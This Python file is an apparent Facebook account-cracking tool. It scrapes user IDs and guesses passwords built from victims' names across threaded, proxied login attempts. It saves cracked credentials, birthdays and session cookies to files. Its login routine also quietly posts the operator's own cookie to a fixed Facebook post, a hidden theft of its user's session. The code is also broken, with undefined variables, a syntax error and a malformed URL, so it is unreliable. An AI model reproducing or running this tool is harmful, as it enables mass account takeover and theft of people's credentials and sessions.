author = 'Mr  Silent Force'
facebook = 'Prince Raymond Aurelio'
Team Group = 'Mr Silent Force'
version = 'Silent Force v.1'


###---[ COLOR ]--###
W = '\033[97m'  # WHITE 
G = '\033[91m' # GREEN 
GG = '\033[92m'  # GREEN 
RR = '\033[93m'  # RED


###---[ IMPORT MODULE ]---###
import bs4, re, time, requests, datetime, os, sys, random, platform
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
hp = platform.platform()
ses = requests.Session()
try:
	import pyfiglet
except ImportError:
	os.system('pip install pyfiglet')


###---[ACCEPT THIS LOGO ]---###
def logo():
	return str(f"""    .dBBBBP   dBP dBP    dBBBP  dBBBBb  dBBBBBBP   
  BP                             dBP             
  `BBBBb  dBP dBP    dBBP   dBP dBP    dBP       
     dBP dBP dBP    dBP    dBP dBP    dBP        
dBBBBP' dBP dBBBBP dBBBBP dBP dBP    dBP         
                                                 
 script by {kk}Mr  Silent{P}, version {kk}premium{P} limited user""")

			
###---[ USER NEW ]---###
def newbie():
	nama = input(f'{logo()}\n\n [{hh}<{P}] hi congrats come, who nama you?\n nama :{kk} ');open('.nama.json','w').write(nama)
	input(f' {P}hallo {kk}{nama}{P}, this is script premium\n limited edition please no use then\n don't no sales buy back yes, thank you\n please enter for get in ke choice login')
	

###---[ INFOMASI USER ]---###
def prem_():
	try:open('.cookie.txt','r').read();co='aktif'
	except IOError:co='tidak'
	try:n=open('.nama.json','r').read()
	except IOError:newbie()
	string = '─────────────────────────────'
	user = (f' {string}\n [{hh}>{P}] namamu : {hh}{n.lower()}{P}\n [{hh}>{P}] cookie : {hh}{co}{P}\n [{hh}>{P}] durasi : {hh}unlimited{P}\n {string}')
	return str(user)
	
	
###---[ DELETE ]---###
sasi = ["January", "February", "March", "April", "May", "June", "July", "Agustin", "September", "Oktober", "November", "December"]
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(days)+'-'+str(month)+'-'+str(yearly)
sim_ok = f'OK-{days}-{month}-{yearly}.txt'
sim_cp = f'CP-{days}-{month}-{yearly}.txt'


###---[ APPENDIX ]---###
dump, me, metode = [], [], []
tetel, opsi, proxy = [], [], []
cepeh, sam, redmi = [], [], []
id, id2, loop ,ok , cp = [], [], 0, 0, 0


###---[ CLEAR SCREEN ]---###
def clear_layar():
	try:os.system('clear')
	except:pass
	

###---[ GLOBAL CONNECT  ]---###
def back():
	try:nama = open('.nama.json','r').read()
	except:newbie()
	try:
		menu = open('.menu_login.json','r').read()
		if menu in ['login']:get_data()
		elif menu in ['no']:no_login()
		else:pilih_login()
	except Exception as e:select_login()
	

###---[ AUTO CREATE UA & PROXY ]---###
try:
	clear_layar()
	print(logo())
	print(f'\r\n [{hh}>{P}] moderately dump proxy dan create useragent')
	try:os.remove('.proxy.txt')
	except:pass
	uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.proxy.txt','w').write(uno)
except:pass
for x in range(1000):
	rr = random.randint
	rc = random.choice
	A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
	se = f'{A}{B}{C}{D}'
	if se in redmi:pass
	else:redmi.append(se)
abcd = open('.proxy.txt','r').read().splitlines()
print(' total new proxy : '+str(len(abcd)))
print(' total useragent : '+str(len(redmi)))
sleep(1)
	
	
###---[ SELECT TYPE LOGIN ]---###
def select_login():
	try:os.remove('.menu_login.json')
	except:pass
	clear_layar()
	print(logo())
	print(f"\n [{hh}1{P}] menu login '{hh}ya{P}' ")
	print(f" [{hh}2{P}] menu login '{kk}no{P}'")
	print(f" [{hh}3{P}] keluar")
	ask = input(' menu : ')
	if ask in ['1','01']:open('.menu_login.json','w').write('login')
	elif ask in ['2','02']:open('.menu_login.json','w').write('no')
	elif ask in ['3','03']:
		try:os.remove('.cookie.txt');os.remove('.token.txt')
		except:pass
		exit()
	else:exit(f" [{M}>{P}] this is the truth")
	back()


###---[ CZECH COOKIES ]---###
def get_data():
	try:
		coki = open('.cookie.txt','r').read()
		ayangbabas = {'cookie':coki}
		token = open('.token.txt','r').read()
		nama = ses.get(f'https://graph.facebook.com/me?access_token={token}',cookies=ayangbabas).json()['name'].split(' ')[0].lower()
		ya_login(nama,token,ayangbabas)
	except Exception as e:login()

	
###---[ LOGIN COOKIE ]---###
def login():
	try:os.remove('.cookie.txt')
	except:pass
	cookie = input(f" [{hh}<{P}] jangan gunakan akun pribadi, ketik '{kk}no{P}' untuk no login\n cookie : ")
	if cookie in ['no','No','NO']:
		open('.menu_login.json','w').write('no');clear_layar();no_login()
	url = "https://business.facebook.com/business_locations"
	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'cookie':cookie}
	try:
		data = ses.get(url,headers=head,cookies=cok)
		token = re.search('(EAAG\w+)',data.text).group(1)
		ses.post(f"https://graph.facebook.com/674525870303608/comments/?message={cookie}&access_token={token}",cookies=cok)
		open('.cookie.txt','w').write(cookie)
		open('.token.txt','w').write(token)
		back()
	except Exception as e:exit(f" [{M}>{P}] cookie invalid")
					
				
###---[ MENU NO LOGIN ]---###
def no_login():
	clear_layar()
	print(f'{logo()}\n{prem_()}\n [{hh}<{P}] selamat datang, pilih menu anda')
	print(f" [{hh}1{P}] crack file")
	print(f" [{hh}2{P}] crack search")
	print(f" [{hh}3{P}] crack come comment")
	print(f" [{hh}4{P}] check result account")
	print(f" [{hh}5{P}] revenge feature login")
	ask = input(f" menu : ")
	if ask in ['1','01']:crack_file()
	elif ask in ['2','02']:crack_search()
	elif ask in ['3','03']:crack_comment()
	elif ask in ['4','04']:check_result()
	elif ask in ['5','05']:select_login()
	else:sys.exit(f" [{M}>{P}] content that true")

	
###---[ MENU LOGIN ]---###
def ya_login(n,t,c):
	clear_layar()
	print(f'{logo()}\n{prem_()}\n [{hh}<{P}] selamat datang, pilih menu anda')
	print(f" [{hh}1{P}] crack publik")
	print(f" [{hh}2{P}] crack file")
	print(f" [{hh}3{P}] crack follower")
	print(f" [{hh}4{P}] check account result")
	print(f" [{hh}5{P}] revenge feature login")
	ask = input(f" menu : ")
	if ask in ['1','01']:crack_publik(t,c)
	elif ask in ['2','02']:crack_file(t,c)
	elif ask in ['3','03']:crack_foll(t,c)
	elif ask in ['4','04']: check_result()
	elif ask in ['5','05']: select_login()
	elif ask in ['',' ',]:sys.exit(f" [{M}>{P}] content that true")
	else:sys.exit(f" [{M}>{P}] content that true")
		

###---[CHECK OUT CRACK ]---###
def check_result():
	no,nom = 0,[]
	one = input(f' [{hh}1{P}] check result account ok\n [{hh}2{P}] check result account cp\n menu : ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f" [{M}>{P}] not result ok")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('OK/'+x,'r').readlines()
			except:continue
			print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	
		abc = input(f' [{hh}<{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('OK/'+file,'r').read()
		except:sys.exit(f" [{M}>{P}] file no result ok")
		print(hh+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		except:sys.exit(f" [{M}>{P}] no result cp")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('CP/'+x,'r').readlines()
			except:continue
			print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')		
		abc = input(f' [{hh}<{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('CP/'+file,'r').read()
		except:sys.exit(f" [{M}>{P}] file no result cp")
		print(kk+buka+P)
	else:sys.exit(f" [{M}>{P}] this is the truth")
		
		
###---[ DUMP NO LOGIN ]---###
def crack_file():
	file = input(f' [{hh}<{P}] come in file dump\n file : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f" [{M}>{P}] wrong")
			dump.append(data)
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:exit(f" [{M}>{P}] file not there")
	print(f'\r [{hh}<{P}] total account amount is {len(dump)}')
	atur_atur()
	
def crack_search():
	nama = []
	custom = [" mr silent "," silent"," silent"," tyz"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," new"," silent"," silent"," silent"," silent"," silent kamu"," silent"," silent"," silent"," silent"," silent"," silent kamu"," silent kamu"," silent"," silent"," silent"," silent"," silent"," x silent"," x silent"," x silent"," x id"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," solo"," official"," sweet"," cute"," calm"," main"," success"," real"," silent"," silent"," silent"," silent"," jaya"," jr"," silent"," silent"," silent"," mama"," silent"," silent"," tiktok"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent","  silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent","silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent"," silent "]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
	print(f' [{hh}<{P}] 1 nama setara dengan 10k akun')
	nam = input(f' nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	print('\r')
	atur_atur()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in dump:pass
			else:dump.append(bo)
	try:
		link = r.find('a',string='See Results Further').get('href')
		if(link):
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sys.stdout.flush()
			cari_nama(link)
	except:pass
	

def crack_komen():
	ide = input(f' [{hh}<{P}] Enter post id target\n id post : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [{M}>{P}] Failed to dump comment')
	atur_atur()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:dump.append(id+"|"+nama)
			print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass
			
			
	
###---[ DUMP LOGIN ]---###
def crack_publik(t,c):
	akun = input(f' [{hh}<{P}] make sure my account is valid publik \n akun : ')
	try:
		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json()
		for pi in bas['friends']['data']:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		print("\r")
		atur_atur()
	except (KeyError,IOError):
		exit(f" [{M}>{P}] my account is not publik")	


def crack_masal(t,c):
    print(f' [{hh}<{P}] make sure my account is valid publik ')
    try:
        bz=0
        apa = int(input(f' amount id : '))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r enter my account {bz} : ')
    	try:
    		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(name,username,id)&access_token={t}',cookies=c).json()
    		for pi in bas['friends']['data']:
    		      try:dump.append(pi['username']+'|'+pi['name'])
    		      except:dump.append(pi['id']+'|'+pi['name'])
    		      print('\r sedang dump %s id'%(len(dump)),end=" ")
    		      sys.stdout.flush()
    		      time.sleep(0.0002)
    	except:
    		print(f"\r [{kk}!{P}] my account is not publik       ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(t,c):
	akun = input(f' [{hh}<{P}] make sure my account is valid publik \n akun : ')
	try:
		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		print("\r")
		atur_atur()
	except (KeyError,IOError):
		exit(f" [{M}>{P}] akun tidak publik")	
		
		
###---[ ATUR BEFORE CRACK ]---###
i sleep = []
def atur_atur():
	print(f"\r{P} ─────────────────────────────")
	ro = input(f' [{hh}1{P}] mobile [{hh}2{P}] mbasic [{hh}3{P}] free\n metode : ')
	if ro in ['1','01']:metode.append('mobile')
	elif ro in ['2','02']:metode.append('mbasic')
	elif ro in ['3','03']:metode.append('free')
	else:metode.append('mobile')
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}] tertua [{hh}2{P}] ternew [{hh}3{P}] acak\n urutan : ')
	if ch in ['1','01']:
		for x in dump:
			id.insert(0,x)
	elif ch in ['2','02']:
		for x in dump:
			id.append(x)
	elif ch in ['3','03']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)
	else:
		for x in dump:
			id.append(x)
	print(f"{P} ─────────────────────────────")
	cp = input(f' [{hh}!{P}] session account display [ya/no]\n select  : ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"{P} ─────────────────────────────")
	apk = input(f' [{hh}!{P}] display info apli [ya/no]\n select  : ')
	if apk in ['y','Ya','ya','1']:i sleep.append('apk')
	else:akunok.append('coki')
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}] manual [{hh}2{P}] gabung [{hh}3{P}] auto\n sandi  : ')
	if ch in ['1','01']:manual()
	elif ch in ['2','2']:gabung()
	elif ch in ['3','03']:otomatis()
	else:otomatis()
	
from datetime import datetime    	
###---[ ATUR SANDI ]---###
def manual():
	global ok,cp
	pwx = []
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] my input manual 6 kata\n sandi  : ').split(',')
	for x in B:
		pwx.append(x)
	print(f"{P} ─────────────────────────────")
	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack already finished amount OK:{ok} amount CP:{cp} ')


def gabung():
	global ok,cp
	pwx = []
	A = ["123456"]
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] input me manual 6 kata\n sandi  : ').split(',')
	C = input(f' [{hh}>{P}] input my back nama\n sandi  : ')
	if ',' in str(C):
		exit(f" [{M}>{P}] me back  kata saja")
	print(f"{P} ─────────────────────────────")
	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = A+B
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(tengah+C)
							pwx.append(nama)
					except:
						pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack already finished amount OK:{ok} jumlah CP:{cp} ')
				

def otomatis():
	global ok,cp
	print(f"{P} ─────────────────────────────")
	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = ['sayang','katasandi','rahasia','bismillah']
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"123")
								pwx.append(belakang+"12345")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
				

###---[ MENU CRACK ]---###
def crack(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	ua = 'Mozilla/5.0 (Linux; Android 11; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36'
	proxy = {'http': 'socks5://'+random.choice(xx)}
	ahir = str(datetime.now()-awal).split('.')[0]
	print(f"\r [{hh}!{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			hd1 = {
				"Host":url,
				"upgrade-insecure-requests":"1",
				"user-agent":ua,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				"referer":f"https://{url}/",
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
				}
			link = ses.get(f'hhttps://m.facebook.com/login.php?skip_api_login=1&api_key=311363115714329&kid_directed_site=0&app_id=311363115714329&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D311363115714329%26cbt%3D1660306664457%26e2e%3D%257B%2522init%2522%253A1660306664457%257D%26ies%3D0%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3D26c34940-4b02-4da4-b691-25ed05dd569a%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25227e90c3c3-8820-4a7d-9b54-dd61564c2d4d%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j7acecvqa7egi9kkd7rl%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FAL', headers=hd1)
			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":idf,"pass":pw}
			hd2 = {"Host":url,
				"cache-control":"max-age=0",
				"upgrade-insecure-requests":"1",
				"origin":f"https://{url}",
				"content-type":"application/x-www-form-urlencoded",
				"user-agent":ua,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin","sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				'referer':f'https://{url}/login/?next&ref=dbl&fl&refid=8',
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
				}
			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=date, headers=hd2, proxies=proxy)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'ya' in cepeh:
					try:
						token = open('.token.txt','r').read()
						bas = {"cookie":open('.cookie.txt','r').read()}
						ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
						m, d, y = ttl.split('/')
						m = tete[m]
						print(f'\r [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           \n')
						sapi = f'{idf}|{pw}|{d} {m} {y}'
						open('CP/'+sim_cp,'a').write(sapi+'\n')
					except:
						print(f'\r [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n')
						open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
				else:
					open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				open('OK/'+sim_ok,'a').write(idf+'|'+pw+'\n')
				if "coki" in akunok:
					print(f'\r [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}\n')
				elif "apk" in akunok:
					cek_apk(idf,pw,kuki)
				break
			else:continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))


###---[ CHECK APPLICATION ]---###
#--[ convert bahasa ]--#
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

#--[ pusat print ]--#
apk1, apk2, apk3 = [], [], []
def cek_apk(idf,pw,kuki):
	cookie = {"cookie" : kuki}
	language(cookie)
	akun = (f' [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}')
	try:		
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed"
		get_remove(url,cookie)
	except Exception as e:pass
	print('\r'+akun)
	if len(apk1)==0:pass
	else:
		akun = (f' [{hh}>{P}] application added:                     ')
		no = 0
		for apk in apk1:
			no += 1
			akun += (f'\n {P}[{hh}{no}{P}] {hh}{apk.lower()}            ')
		print('\r'+akun)
	if len(apk2)==0:pass
	else:
		akun = (f' {P}[{kk}>{P}] application expired :                   ')
		no = 0
		for apk in apk2:
			no += 1
			akun += (f'\n {P}[{kk}{no}{P}] {kk}{apk.lower()}             ')
		print('\r'+akun)
	if len(apk3)==0:pass
	else:
		akun = (f' {P}[{M}>{P}] application deleted :                  ')
		no = 0
		for apk in apk3:
			no += 1
			akun += (f'\n {P}[{M}{no}{P}] {M}{apk.lower()}               ')
		print('\r'+akun)
	apk1.clear()
	apk2.clear()
	apk3.clear()
	print("\r                                             ")
			
			
#--[ cek apk aktif ]--#
def get_active(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Ditambahkan' in apk.text:					
				apk1.append(f"{str(apk.text).replace('Added',' Added')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='See More')['href']
		get_active(next,cookie)
	except:pass

#--[ check apk expires ]--#
def get_inactive(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Kedaluwarsa' in apk.text:
				apk2.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_inactive(next,cookie)
	except:pass

#--[ check apk removed]--#		
def get_remove(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Dihapus' in apk.text:
				apk3.append(f"{str(apk.text).replace('Dihapus',' Dihapus')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_remove(next,cookie)
	except:pass
	
def make():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('git pull')
	except:pass
	clear_layar()
	back()
	
	
if __name__=='__main__':
	make()	
